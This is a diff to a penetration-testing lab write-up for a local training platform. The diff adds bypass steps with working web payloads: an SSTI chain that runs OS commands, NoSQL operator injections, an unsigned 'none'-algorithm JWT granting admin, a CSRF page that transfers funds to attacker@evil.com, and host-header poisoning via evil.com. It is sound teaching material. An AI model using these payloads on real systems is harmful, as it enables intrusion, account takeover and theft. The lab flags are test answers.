@@ -2,7 +2,7 @@
 
 ## Table of Contents
 
-### Beginner Labs
+### Beginner Labs (8 Labs)
 1. [SQL Injection Lab](#sql-injection-lab)
 2. [Cross-Site Scripting (XSS) Lab](#cross-site-scripting-xss-lab)
 3. [Authentication Bypass Lab](#authentication-bypass-lab)
@@ -11,18 +11,17 @@
 6. [Access Control Lab](#access-control-lab)
 7. [Security Misconfiguration Lab](#security-misconfiguration-lab)
 8. [Command Injection Lab](#command-injection-lab)
-9. [Insecure Deserialization Lab](#insecure-deserialization-lab)
 
-### Intermediate Labs
-10. [Server-Side Template Injection (SSTI) Lab](#server-side-template-injection-ssti-lab)
-11. [LDAP Injection Lab](#ldap-injection-lab)
-12. [NoSQL Injection Lab](#nosql-injection-lab)
-13. [JWT Manipulation Lab](#jwt-manipulation-lab)
-14. [Advanced CSRF Lab](#advanced-csrf-lab)
-15. [GraphQL Injection Lab](#graphql-injection-lab)
-16. [WebSocket Manipulation Lab](#websocket-manipulation-lab)
-17. [Race Condition Lab](#race-condition-lab)
-18. [HTTP Host Header Injection Lab](#http-host-header-injection-lab)
+### Intermediate Labs (9 Labs with Bypass Techniques)
+9. [Server-Side Template Injection (SSTI) Lab](#server-side-template-injection-ssti-lab)
+10. [LDAP Injection Lab](#ldap-injection-lab)
+11. [NoSQL Injection Lab](#nosql-injection-lab)
+12. [JWT Manipulation Lab](#jwt-manipulation-lab)
+13. [Advanced CSRF Lab](#advanced-csrf-lab)
+14. [GraphQL Injection Lab](#graphql-injection-lab)
+15. [WebSocket Manipulation Lab](#websocket-manipulation-lab)
+16. [Race Condition Lab](#race-condition-lab)
+17. [HTTP Host Header Injection Lab](#http-host-header-injection-lab)
 
 ---
 
@@ -337,30 +336,13 @@
 
 ---
 
-### Insecure Deserialization Lab
-
-**Lab URL:** `http://localhost:5000/api/vuln/deserialize`
-
-**Objective:** Exploit insecure deserialization for remote code execution.
-
-#### Step 1: Object Injection
-1. **Test malicious serialized objects:**
-   ```json
-   {"cmd": "ls -la"}
-   {"constructor": {"name": "Function"}, "code": "return process.env"}
-   ```
-2. **Burp Action:** Base64 encode payloads for testing
-3. **Screenshot Location:** Save code execution evidence
-
----
-
 ## Intermediate Labs
 
 ### Server-Side Template Injection (SSTI) Lab
 
 **Lab URL:** `http://localhost:5000/api/vuln/ssti`
 
-**Objective:** Exploit SSTI vulnerabilities for remote code execution.
+**Objective:** Exploit SSTI vulnerabilities for remote code execution with bypass techniques.
 
 #### Step 1: Template Engine Detection
 1. **Test basic SSTI payloads:**
@@ -378,13 +360,31 @@
    ```
 2. **Screenshot Location:** Save environment variable exposure
 
+#### Step 3: WAF Bypass - Alternate Delimiters ⭐
+**Bypass Technique:** Use alternate delimiter syntax to bypass WAF filters
+1. **Payload with {% %} delimiters:**
+   ```
+   {%print(7*7)%}
+   ```
+2. **Flag:** `{SSTI_WAF_BYPASS_ALTERNATE_DELIMITERS}`
+3. **Screenshot Location:** Save successful bypass response
+
+#### Step 4: Filter Evasion - Attribute Chain Bypass ⭐
+**Bypass Technique:** Use attribute chaining to access dangerous functions
+1. **Payload with attribute access:**
+   ```
+   {{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
+   ```
+2. **Flag:** `{SSTI_FILTER_BYPASS_ATTRIBUTE_CHAIN}`
+3. **Screenshot Location:** Save RCE evidence
+
 ---
 
 ### LDAP Injection Lab
 
 **Lab URL:** `http://localhost:5000/api/vuln/ldap-injection`
 
-**Objective:** Exploit LDAP injection vulnerabilities.
+**Objective:** Exploit LDAP injection vulnerabilities with bypass techniques.
 
 #### Step 1: Authentication Bypass
 1. **LDAP injection payloads:**
@@ -394,13 +394,23 @@
    ```
 2. **Screenshot Location:** Save authentication bypass evidence
 
+#### Step 2: Wildcard Filter Bypass ⭐
+**Bypass Technique:** Use wildcard character to dump directory entries
+1. **Payload:**
+   ```
+   username=*
+   ```
+2. **Burp Action:** Intercept search request, modify username to `*`
+3. **Flag:** `{LDAP_INJECTION_WILDCARD_BYPASS}`
+4. **Screenshot Location:** Save directory dump showing all users
+
 ---
 
 ### NoSQL Injection Lab
 
 **Lab URL:** `http://localhost:5000/api/vuln/nosql-injection`
 
-**Objective:** Exploit NoSQL injection in MongoDB-style queries.
+**Objective:** Exploit NoSQL injection in MongoDB-style queries with advanced operators.
 
 #### Step 1: Authentication Bypass
 1. **NoSQL injection payloads:**
@@ -410,18 +420,56 @@
    ```
 2. **Screenshot Location:** Save successful bypass
 
+#### Step 2: $gt Operator Bypass ⭐
+**Bypass Technique:** Use greater-than operator for authentication bypass
+1. **Payload:** `username={"$gt":""}`
+2. **Flag:** `{NOSQL_GT_OPERATOR_BYPASS}`
+
+#### Step 3: $regex Operator Bypass ⭐
+**Bypass Technique:** Use regex for pattern-based bypass
+1. **Payload:** `username={"$regex":"^a"}`
+2. **Flag:** `{NOSQL_REGEX_INJECTION}`
+
+#### Step 4: $where JavaScript Execution ⭐
+**Bypass Technique:** Execute JavaScript via $where clause
+1. **Payload:** `username={"$where":"1==1"}`
+2. **Flag:** `{NOSQL_WHERE_CODE_EXECUTION}`
+3. **Screenshot Location:** Save all bypass methods
+
 ---
 
 ### JWT Manipulation Lab
 
 **Lab URL:** `http://localhost:5000/api/vuln/jwt-manipulation`
 
-**Objective:** Exploit JWT vulnerabilities including algorithm confusion and weak secrets.
+**Objective:** Exploit JWT vulnerabilities including algorithm confusion and bypass techniques.
 
 #### Step 1: Algorithm Confusion
 1. **Change RS256 to HS256 in JWT header**
 2. **Use public key as HMAC secret**
 3. **Screenshot Location:** Save successful token manipulation
+
+#### Step 2: "none" Algorithm Bypass ⭐
+**Bypass Technique:** Remove signature verification by using "none" algorithm
+1. **Modify JWT header:**
+   ```json
+   {"alg":"none","typ":"JWT"}
+   ```
+   Base64: `eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0`
+   
+2. **Modify JWT payload:**
+   ```json
+   {"sub":"1234567890","name":"Guest","admin":true}
+   ```
+   Base64: `eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6Ikd1ZXN0IiwiYWRtaW4iOnRydWV9`
+   
+3. **Final token (note trailing dot, no signature):**
+   ```
+   eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6Ikd1ZXN0IiwiYWRtaW4iOnRydWV9.
+   ```
+   
+4. **Flag:** `{JWT_NONE_ALGORITHM_BYPASS}`
+5. **Screenshot Location:** Save admin access evidence
 
 ---
 
@@ -436,13 +484,33 @@
 2. **Test SameSite cookie bypass techniques**
 3. **Screenshot Location:** Save successful CSRF execution
 
+#### Step 2: SameSite=None Cookie Bypass ⭐
+**Bypass Technique:** Exploit SameSite=None cookies in cross-site requests
+1. **Analyze cookie:** `Set-Cookie: csrf_session=user_123; SameSite=None`
+2. **Create evil.html:**
+   ```html
+   <form id="csrf" action="http://localhost:5000/api/vuln/csrf-advanced/transfer" method="POST">
+     <input type="hidden" name="recipient" value="attacker@evil.com">
+     <input type="hidden" name="amount" value="10000">
+     <input type="hidden" name="csrf_token" id="token">
+   </form>
+   <script>
+     const timestamp = Math.floor(Date.now() / 1000);
+     document.getElementById('token').value = 'csrf_' + timestamp;
+     document.getElementById('csrf').submit();
+   </script>
+   ```
+3. **Host on different origin:** `python3 -m http.server 8000`
+4. **Flag:** `{CSRF_SAMESITE_BYPASS_SUCCESSFUL}`
+5. **Screenshot Location:** Save successful transfer evidence
+
 ---
 
 ### GraphQL Injection Lab
 
 **Lab URL:** `http://localhost:5000/api/vuln/graphql-injection`
 
-**Objective:** Exploit GraphQL injection and introspection vulnerabilities.
+**Objective:** Exploit GraphQL injection and introspection vulnerabilities with bypass techniques.
 
 #### Step 1: Schema Introspection
 1. **GraphQL introspection query:**
@@ -463,18 +531,47 @@
    ```
 2. **Screenshot Location:** Save schema information
 
+#### Step 2: Introspection Bypass ⭐
+**Bypass Technique:** Query schema when introspection "disabled"
+1. **Simple introspection:** `{__schema{types{name}}}`
+2. **Flag:** `{GRAPHQL_INTROSPECTION_BYPASS}`
+
+#### Step 3: Query Batching Bypass ⭐
+**Bypass Technique:** Extract multiple resources in single request
+1. **Batch query:** `[{users{id}},{posts{title}}]`
+2. **Flag:** `{GRAPHQL_BATCH_QUERY_BYPASS}`
+
+#### Step 4: Depth Limit Bypass ⭐
+**Bypass Technique:** Deeply nested queries to access sensitive data
+1. **Deep nesting:** `{users{posts{comments{author{posts{comments{id}}}}}}}`
+2. **Flag:** `{GRAPHQL_DEPTH_LIMIT_BYPASS}`
+
+#### Step 5: __typename Disclosure ⭐
+**Bypass Technique:** Use __typename to discover field types
+1. **Type disclosure:** `{users{id,username,__typename}}`
+2. **Flag:** `{GRAPHQL_TYPENAME_DISCLOSURE}`
+3. **Screenshot Location:** Save all bypass methods
+
 ---
 
 ### WebSocket Manipulation Lab
 
 **Lab URL:** `http://localhost:5000/api/vuln/websocket-manipulation`
 
-**Objective:** Exploit WebSocket vulnerabilities through message manipulation.
+**Objective:** Exploit WebSocket vulnerabilities through message manipulation and origin bypass.
 
 #### Step 1: Message Interception
 1. **Use Burp to intercept WebSocket traffic**
 2. **Modify messages in real-time**
 3. **Screenshot Location:** Save manipulated WebSocket messages
+
+#### Step 2: Origin Validation Bypass ⭐
+**Bypass Technique:** Bypass weak origin validation with substring matching
+1. **Burp Action:** Intercept WebSocket upgrade request
+2. **Modify Origin header to:** `http://evil.trusted.com` or `http://trusted-attacker.com`
+3. **Server accepts due to substring match on "trusted"**
+4. **Flag:** `{WEBSOCKET_ORIGIN_VALIDATION_BYPASS}`
+5. **Screenshot Location:** Save successful WebSocket connection from malicious origin
 
 ---
 
@@ -482,12 +579,23 @@
 
 **Lab URL:** `http://localhost:5000/api/vuln/race-condition`
 
-**Objective:** Exploit race condition vulnerabilities in concurrent requests.
+**Objective:** Exploit race condition vulnerabilities with TOCTOU bypass.
 
 #### Step 1: Concurrent Request Testing
 1. **Use Burp Turbo Intruder for simultaneous requests**
 2. **Target balance transfer or similar operations**
 3. **Screenshot Location:** Save evidence of race condition exploitation
+
+#### Step 2: TOCTOU Bypass ⭐
+**Bypass Technique:** Time-of-Check-Time-of-Use exploitation
+1. **Burp Repeater Method:** Send to Repeater → Create tab group with 20 copies → Send group in parallel
+2. **Burp Intruder Method:**
+   - Payload type: Null payloads (50 payloads)
+   - Resource Pool: 50 concurrent requests
+   - Exploit time gap between validation and usage
+3. **Expected Result:** Multiple $50 discounts applied, balance > $150
+4. **Flag:** `{RACE_CONDITION_EXPLOITED_MULTIPLE_USES}`
+5. **Screenshot Location:** Save balance showing multiple discount applications
 
 ---
 
@@ -505,6 +613,19 @@
    X-Host: evil.com
    ```
 2. **Screenshot Location:** Save successful header injection
+
+#### Step 2: X-Forwarded-Host Bypass ⭐
+**Bypass Technique:** Use X-Forwarded-Host for password reset poisoning
+1. **Burp Action:** Intercept password reset POST request
+2. **Add header:** `X-Forwarded-Host: evil.com`
+3. **Reset link generated with attacker's domain**
+4. **Flag:** `{HOST_HEADER_X_FORWARDED_HOST_BYPASS}`
+
+#### Step 3: X-Original-Host Bypass ⭐
+**Bypass Technique:** Use alternative X-Original-Host header
+1. **Add header:** `X-Original-Host: attacker.com`
+2. **Flag:** `{HOST_HEADER_X_ORIGINAL_HOST_BYPASS}`
+3. **Screenshot Location:** Save both bypass methods
 
 ---
 
@@ -558,7 +679,7 @@
 
 ## Conclusion
 
-This comprehensive writeup covers all 18 labs in the Zeroday Academy platform. Each lab is designed to teach specific vulnerability classes and exploitation techniques. Practice these exercises in the controlled environment to build your penetration testing skills.
+This comprehensive writeup covers all 17 labs (8 beginner + 9 intermediate) in the Zeroday Academy platform. Each intermediate lab includes intermediate-level bypass techniques marked with ⭐. Practice these exercises in the controlled environment to build your penetration testing skills.
 
 Remember to:
 1. Always use Burp Suite systematically
